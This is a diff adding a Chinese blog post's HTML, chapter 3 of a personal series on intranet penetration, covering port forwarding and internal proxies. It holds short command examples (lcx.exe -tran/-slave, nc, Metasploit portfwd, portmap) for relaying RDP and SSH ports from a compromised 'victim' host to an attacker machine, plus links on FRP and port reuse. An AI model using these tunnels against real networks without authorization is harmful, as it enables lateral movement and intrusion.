@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>内网渗透体系建设--第3章--端口转发与内网代理 | he11的农场</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://dydydy123.github.io/favicon.ico?v=1686555449410">
+<link rel="stylesheet" href="https://dydydy123.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="端口转发
+1.目标机器有公网ip，但是端口被防火墙限制
+博客：https://www.zhuguodong.com/?id=486
+lcx.exe与portmap工具：https://github.com/Brucetg/Pentest-t..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://dydydy123.github.io">
+        <img src="https://dydydy123.github.io/images/avatar.png?v=1686555449410" class="site-logo">
+        <h1 class="site-title">he11的农场</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="https://dydydy123.github.io/post/you-lian" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      ganma~~~~~~~~~~
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://dydydy123.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">内网渗透体系建设--第3章--端口转发与内网代理</h2>
+            <div class="post-date">2023-04-03</div>
+            
+              <div class="feature-container" style="background-image: url('https://dydydy123.github.io/post-images/nei-wang-shen-tou-ti-xi-jian-she-di-2-zhang-duan-kou-zhuan-fa-yu-nei-wang-dai-li.jpg')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <h1 id="端口转发">端口转发</h1>
+<p><strong>1.目标机器有公网ip，但是端口被防火墙限制</strong><br>
+博客：https://www.zhuguodong.com/?id=486<br>
+lcx.exe与portmap工具：https://github.com/Brucetg/Pentest-tools<br>
+端口转发</p>
+<p>winserver上执行 （记得入站规则和开启rdp）</p>
+<pre><code>lcx.exe -tran 4444 127.0.0.1 3389
+</code></pre>
+<p>kali</p>
+<pre><code>rdesktop 172.31.171.152:4444
+</code></pre>
+<p><strong>2..目标机器有公网ip，将内网其他主机端口映射到跳板机某个端口</strong><br>
+<code>LCX利用：</code></p>
+<pre><code>ubuntu: （内网）
+nc -lvnp 22
+</code></pre>
+<p>将内网某主机22端口（此处为ubuntu）映射到本机4444</p>
+<pre><code>win server （DMZ）
+lcx.exe -tran 4444 10.10.10.15 22
+</code></pre>
+<pre><code>kali （公网）
+nc 172.31.171.152 4444
+</code></pre>
+<p><code>MSFShell利用：</code></p>
+<pre><code>portfwd add -l 6666 -r 目标ip -p 目标端口
+portfwd delete -l 6666 -r 192.168.159.154 -p 80
+portfwd list   列出所有端口转发
+add会将端口转发添加到列表中，并将为我们创建一个隧道。请注意，此通道也将存在于Metasploit控制台之外，使其可用于任何终端会话。
+</code></pre>
+<p><strong>3.目标无公网IP，将内网某主机端口映射到VPS某个端口</strong></p>
+<p>在受害机上执行：</p>
+<pre><code>lcx.exe -slave 192.168.1.4(攻击机IP) 4444 127.0.0.1 3389
+这条命令的意思就是将本机的 3389 端口转发到攻击机的 4444 端口上
+</code></pre>
+<p>之后在攻击机上执行（公网kali vps）：</p>
+<pre><code>./portmap -m 2 -p1 4444 -h2 192.168.1.4 -p2 5555
+这条命令的意思就是将本地4444端口接收的数据转发到5555端口
+</code></pre>
+<pre><code>rdesktop 192.168.1.4:5555
+</code></pre>
+<h1 id="内网代理">内网代理</h1>
+<p><strong>FRP使用：</strong><br>
+多级代理：<br>
+<img src="https://dydydy123.github.io/post-images/1685946141094.png" alt="" loading="lazy"><br>
+https://www.viewofthai.link/2022/11/15/%e7%ab%af%e5%8f%a3%e8%bd%ac%e5%8f%91%e4%b8%8e%e5%86%85%e7%bd%91%e4%bb%a3%e7%90%86/</p>
+<h1 id="端口复用">端口复用</h1>
+<p><img src="https://dydydy123.github.io/post-images/1685948865811.png" alt="" loading="lazy"><br>
+https://blog.csdn.net/yang1234567898/article/details/125173701</p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://dydydy123.github.io/post/nei-wang-shen-tou-ti-xi-jian-she-di-2-zhang-nei-wang-zi-yuan-tan-ce-huo-qu-chang-jian-ying-yong-ruan-jian-ping-ju/">
+                  <h3 class="post-title">
+                    内网渗透体系建设--第2章--内网资源探测--获取常见应用软件凭据
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
